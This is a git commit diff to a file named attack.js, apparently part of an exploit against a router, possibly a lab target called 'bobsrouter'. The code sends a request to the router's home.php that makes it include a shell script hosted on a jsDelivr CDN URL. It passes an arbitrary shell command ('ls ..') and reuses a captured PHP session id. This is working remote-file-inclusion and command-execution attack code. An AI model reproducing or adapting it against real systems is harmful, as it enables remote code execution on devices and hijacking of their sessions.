7f89c0278f39bf73719be8e966e2cfa405fd3e6a
Daniel Spencer <danielspencer305@hotmail.co.uk>
2022-03-06 14:03:36 -0500

    Try ls ..

--- attack.js
+++ attack.js
@@ -33,8 +33,9 @@ xhr.onreadystatechange = function() {
 		}
 
 		const SHELL = "https://cdn.jsdelivr.net/gh/dspencer12/bobsrouter@0.29/shell";
+		const cmd = "ls ..";
 
-		xhr2.open("GET", ROUTER + "/home.php?action=" + encodeURIComponent(SHELL) + "&x=ls&PHPSESSID=" + sessionId, true);
+		xhr2.open("GET", ROUTER + "/home.php?action=" + encodeURIComponent(SHELL) + "&x=" + encodeURIComponent(cmd) + "&PHPSESSID=" + sessionId, true);
 		xhr2.send('');
 	}
 }
